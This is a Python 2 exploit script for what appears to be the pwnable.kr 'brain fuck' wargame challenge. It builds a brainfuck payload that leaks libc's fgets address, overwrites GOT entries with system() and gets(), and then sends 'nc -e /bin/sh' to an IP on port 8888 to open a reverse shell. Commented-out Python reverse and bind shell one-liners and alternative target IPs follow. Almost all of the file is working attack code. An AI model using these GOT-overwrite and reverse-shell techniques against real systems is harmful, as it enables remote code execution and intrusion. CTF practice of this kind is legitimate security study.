import socket, struct, os, subprocess, sys, time

# Build Payload

# move pointer to got.plt fgets
payload = "<"*(0x0804a0a0 - 0x0804a010)
# read fgets address
payload += ".>"*4 
# move pointer back to got.plt fgets
payload += "<"*4
# write system() to fgets
payload += ",>"*4 
# move pointer to got.plt memset
payload += ">"*((0x0804a02c-0x0804a010)-4)
# write memset to fgets address
payload += ",>"*4
# move to putchar() but already here
# write pointer to main() -0x08048671 
payload += ",>"*4
# call putchar which is now main
payload += "."
payload += "\r\n"


p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/brain_fuck/bf"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

data = ''
while "type" not in data:
	data = p.stdout.readline()
	print data


print '[*] sending payload'
p.stdin.write(payload)
	
output = p.stdout.read(4)
fgets_address = struct.unpack("<I", output[0:4])[0]
print '[*] fgets address = 0x%08x' % fgets_address

# from libc.so.6
system_offset = 0x0003e3e0
fgets_offset = 0x000632c0
gets_offset = 0x00064520
system_address = fgets_address - (fgets_offset - system_offset)
gets_address = fgets_address + (gets_offset - fgets_offset)
print "[*] system() at 0x%08x" % system_address
print "[*] gets() at 0x%08x" % gets_address
print '[*] overwriting got.plt fget() address with system() address'
p.stdin.write(struct.pack("I",system_address))

print '[*] overwriting got.plt memset with gets() address'
p.stdin.write(struct.pack("I", gets_address))

print '[*] overwriting got.plt putchar with main()-0x08048671'
p.stdin.write(struct.pack("I", 0x08048671))

data = ''
while "type" not in data:
	data = p.stdout.readline()
	print data

ip_address = "127.0.0.1"
#ip_address = "192.168.0.161"
#ip_address = "70.77.162.3"
#p.stdin.write("/bin/sh")

#while(True):
#	p.stdin.write(raw_input())
#	p.stdout.read(512)
	

p.stdin.write("nc -e /bin/sh " + ip_address + " 8888")

#p.stdin.write("/usr/bin/python2.7 -c \'import subprocess, socket, os; "\
#		"s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "\
#		"s.connect((\"" + ip_address + "\", 8888));"\
#		"os.dup2(s.fileno(), 0), os.dup2(s.fileno(), 1), os.dup2(s.fileno(), 2);"\
#		"p = subprocess.call([\"/bin/sh\", \"-i\"],stdin=subprocess.PIPE,stdout=subprocess.PIPE);\'")

#p.stdin.write(
#p.stdin.write( "/usr/bin/python2.7 -c \'import subprocess, socket, os;"\
#   	"s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "\
#     	"s.bind((\\\'\\\', 8888)); "\
#      	"s.listen(1);"\
#        "conn,addr = s.accept();"\
#	"os.dup2(conn.fileno(), 0), os.dup2(conn.fileno(), 1), os.dup2(conn.fileno(), 2); "\
#	"p = subprocess.call([\"/bin/sh\", \"-i\"]);\'")



#while(True):
#	time.sleep(3)




